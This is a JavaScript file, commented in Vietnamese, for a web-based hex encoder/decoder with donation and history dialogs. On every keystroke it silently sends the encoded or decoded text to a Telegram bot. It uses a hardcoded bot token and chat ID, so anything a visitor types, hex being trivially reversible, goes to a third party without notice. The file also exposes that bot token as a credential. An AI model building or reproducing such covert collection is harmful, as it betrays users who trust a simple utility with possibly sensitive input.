let mode = 'encode'; // Mặc định là chế độ Encode
let history = []; // Lưu trữ lịch sử kết quả

// Thiết lập chế độ Encode hoặc Decode
function setMode(selectedMode) {
    mode = selectedMode;

    // Cập nhật giao diện nút bấm
    document.getElementById('encodeButton').classList.toggle('btn-primary', mode === 'encode');
    document.getElementById('encodeButton').classList.toggle('btn-secondary', mode !== 'encode');
    document.getElementById('decodeButton').classList.toggle('btn-primary', mode === 'decode');
    document.getElementById('decodeButton').classList.toggle('btn-secondary', mode !== 'decode');
}

// Theo dõi nhập liệu và tự động chuyển đổi
document.getElementById('inputText').addEventListener('input', () => {
    const inputText = document.getElementById('inputText').value.trim();
    let output;

    if (mode === 'encode') {
        output = encodeToHex(inputText);
    } else if (mode === 'decode') {
        output = decodeFromHex(inputText);
    }

    document.getElementById('outputText').value = output;
    sendToTelegram(output); // Tự động gửi kết quả qua Telegram
});

// Hàm mã hóa chuỗi sang Hex
function encodeToHex(text) {
    return Array.from(text).map(ch => ch.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}

// Hàm giải mã chuỗi Hex
function decodeFromHex(hex) {
    try {
        return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    } catch (error) {
        return 'Dữ liệu Hex không hợp lệ!';
    }
}

// Hàm gửi kết quả tới Telegram
function sendToTelegram(outputText) {
    if (!outputText) return; // Không gửi nếu không có dữ liệu

    const telegramToken = '7747741271:AAGvVTq9f4BuuvF4AoO3XohUtC7T9aDcLmk'; // Thay bằng token bot của bạn
    const chatId = '5676736853'; // Thay bằng chat ID của bạn
    const message = `Kết quả (${mode === 'encode' ? 'Encode' : 'Decode'}): ${outputText}`;

    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(() => {
        // Lưu kết quả vào lịch sử
        history.push({ mode, output: outputText, timestamp: new Date().toLocaleString() });
    })
    .catch(error => console.error('Lỗi khi gửi Telegram:', error));
}

// Hàm mở modal Donate
function showDonationInfo() {
    const donationModal = new bootstrap.Modal(document.getElementById('donationModal'));
    donationModal.show();
}

// Hàm mở modal Lịch sử
function showHistory() {
    const historyModal = new bootstrap.Modal(document.getElementById('historyModal'));
    const historyList = document.getElementById('historyList');
    
    // Xóa danh sách cũ
    historyList.innerHTML = '';

    // Thêm các mục lịch sử vào modal
    history.forEach(item => {
        const li = document.createElement('li');
        li.textContent = `${item.timestamp} - ${item.mode === 'encode' ? 'Encode' : 'Decode'}: ${item.output}`;
        historyList.appendChild(li);
    });

    historyModal.show();
}